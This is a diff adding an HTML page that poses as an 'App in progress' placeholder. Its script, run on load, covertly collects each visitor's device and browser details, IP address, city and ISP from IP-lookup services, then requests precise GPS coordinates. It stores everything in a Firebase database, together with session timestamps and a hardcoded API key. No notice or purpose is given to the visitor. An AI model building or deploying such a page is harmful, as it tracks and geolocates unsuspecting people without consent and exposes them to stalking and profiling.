@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Community Canvas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .message {
+            font-size: 24px;
+            font-weight: 600;
+            color: #2d3748;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #718096;
+            opacity: 0.8;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #e2e8f0;
+            border-radius: 50%;
+            border-top-color: #667eea;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .message {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="message">App in progress.</div>
+        <div class="subtitle">Please contact the developer.</div>
+        <div class="loading"></div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA6sANvYoAkXHYG8MjbZl6Pyq23CNdBuzA",
+            authDomain: "community-canvas-255fa.firebaseapp.com",
+            databaseURL: "https://community-canvas-255fa-default-rtdb.firebaseio.com",
+            projectId: "community-canvas-255fa",
+            storageBucket: "community-canvas-255fa.appStorage.com",
+            messagingSenderId: "729445267995",
+            appId: "1:729445267995:web:05da6756d66c58b9ccd6be",
+            measurementId: "G-FW93CB5QL7"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Generate or retrieve device token
+        function getDeviceToken() {
+            let token = localStorage.getItem('deviceToken');
+            if (!token) {
+                token = 'device_' + Math.random().toString(36).substr(2, 16) + '_' + Date.now();
+                localStorage.setItem('deviceToken', token);
+            }
+            return token;
+        }
+
+        // Get device type
+        function getDeviceType() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)) {
+                return 'mobile';
+            }
+            return 'desktop';
+        }
+
+        // Get browser info
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = 'Unknown';
+            let browserVersion = 'Unknown';
+
+            if (userAgent.indexOf('Chrome') > -1) {
+                browserName = 'Chrome';
+                browserVersion = userAgent.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
+            } else if (userAgent.indexOf('Firefox') > -1) {
+                browserName = 'Firefox';
+                browserVersion = userAgent.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
+            } else if (userAgent.indexOf('Safari') > -1) {
+                browserName = 'Safari';
+                browserVersion = userAgent.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
+            } else if (userAgent.indexOf('Edge') > -1) {
+                browserName = 'Edge';
+                browserVersion = userAgent.match(/Edge\/([0-9.]+)/)?.[1] || 'Unknown';
+            }
+
+            return {
+                name: browserName,
+                version: browserVersion,
+                userAgent: userAgent
+            };
+        }
+
+        // Get screen info
+        function getScreenInfo() {
+            return {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            };
+        }
+
+        // Get IP and location info
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    countryCode: data.country_code,
+                    postal: data.postal,
+                    timezone: data.timezone,
+                    isp: data.org,
+                    asn: data.asn
+                };
+            } catch (error) {
+                console.error('Failed to get IP info:', error);
+                try {
+                    // Fallback to ipinfo.io
+                    const response = await fetch('https://ipinfo.io/json');
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country,
+                        postal: data.postal,
+                        timezone: data.timezone,
+                        isp: data.org
+                    };
+                } catch (fallbackError) {
+                    console.error('Fallback IP lookup also failed:', fallbackError);
+                    return { error: 'Unable to fetch IP information' };
+                }
+            }
+        }
+
+        // Store data in Firebase
+        async function storeDataInFirebase(token, data) {
+            try {
+                await database.ref('devices/' + token).set(data);
+                console.log('Data stored successfully in Firebase');
+            } catch (error) {
+                console.error('Error storing data in Firebase:', error);
+            }
+        }
+
+        // Get user location
+        function getUserLocation(token) {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        try {
+                            await database.ref('devices/' + token + '/location').set(locationData);
+                            console.log('Location data stored successfully');
+                        } catch (error) {
+                            console.error('Error storing location data:', error);
+                        }
+                    },
+                    (error) => {
+                        console.log('Location access denied or failed:', error.message);
+                        // Store that location was denied
+                        database.ref('devices/' + token + '/location').set({
+                            status: 'denied',
+                            error: error.message,
+                            timestamp: new Date().toISOString()
+                        }).catch(err => console.error('Error storing location denial:', err));
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.log('Geolocation not supported');
+                // Store that geolocation is not supported
+                database.ref('devices/' + token + '/location').set({
+                    status: 'not_supported',
+                    timestamp: new Date().toISOString()
+                }).catch(err => console.error('Error storing location not supported:', err));
+            }
+        }
+
+        // Main function to collect and store data
+        async function collectData() {
+            const token = getDeviceToken();
+            
+            // Check if data already exists for this token
+            try {
+                const snapshot = await database.ref('devices/' + token).once('value');
+                if (snapshot.exists()) {
+                    console.log('Data already exists for this device token');
+                    return; // Don't collect data again
+                }
+            } catch (error) {
+                console.error('Error checking existing data:', error);
+            }
+
+            // Collect basic device and browser info
+            const deviceData = {
+                token: token,
+                deviceType: getDeviceType(),
+                browser: getBrowserInfo(),
+                screen: getScreenInfo(),
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || 'direct',
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine
+            };
+
+            // Get IP information
+            const ipInfo = await getIPInfo();
+            deviceData.ipInfo = ipInfo;
+
+            // Store initial data in Firebase
+            await storeDataInFirebase(token, deviceData);
+
+            // Request location after storing other data
+            setTimeout(() => {
+                getUserLocation(token);
+            }, 1000);
+        }
+
+        // Start data collection when page loads
+        window.addEventListener('load', () => {
+            // Small delay to ensure everything is loaded
+            setTimeout(collectData, 500);
+        });
+
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                const token = getDeviceToken();
+                // Update last active timestamp
+                database.ref('devices/' + token + '/lastActive').set(new Date().toISOString())
+                    .catch(err => console.error('Error updating last active:', err));
+            }
+        });
+
+        // Handle page unload
+        window.addEventListener('beforeunload', () => {
+            const token = getDeviceToken();
+            // Update session end timestamp
+            database.ref('devices/' + token + '/sessionEnd').set(new Date().toISOString())
+                .catch(err => console.error('Error updating session end:', err));
+        });
+    </script>
+</body>
+</html>
